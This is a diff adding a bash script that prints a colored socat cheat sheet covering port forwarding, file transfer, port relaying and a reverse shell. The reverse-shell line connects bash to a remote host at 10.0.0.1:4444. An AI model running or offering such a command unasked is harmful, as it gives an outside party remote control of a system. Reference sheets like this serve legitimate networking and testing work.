@@ -1,0 +1,18 @@
+#!/bin/bash
+echo -e "\033[32m╔══════════════════════════════════════╗"
+echo -e "║  🔄 Socat — Network Swiss Army Knife║"
+echo -e "╚══════════════════════════════════════╝\033[0m"
+echo
+echo -e "\033[33mPort forward:\033[0m"
+echo "  socat TCP-LISTEN:8080,fork TCP:10.0.0.1:80"
+echo
+echo -e "\033[33mReverse shell:\033[0m"
+echo "  socat TCP:10.0.0.1:4444 EXEC:/bin/bash"
+echo
+echo -e "\033[33mFile transfer:\033[0m"
+echo "  # Receiver: socat TCP-LISTEN:4444,fork FILE:output.txt"
+echo "  # Sender:   socat FILE:input.txt TCP:10.0.0.1:4444"
+echo
+echo -e "\033[33mExample - relay a port:\033[0m"
+echo "  socat TCP-LISTEN:5555,fork TCP:internal-host:22"
+echo -e "\033[90m──────────────────────────────────────\033[0m"
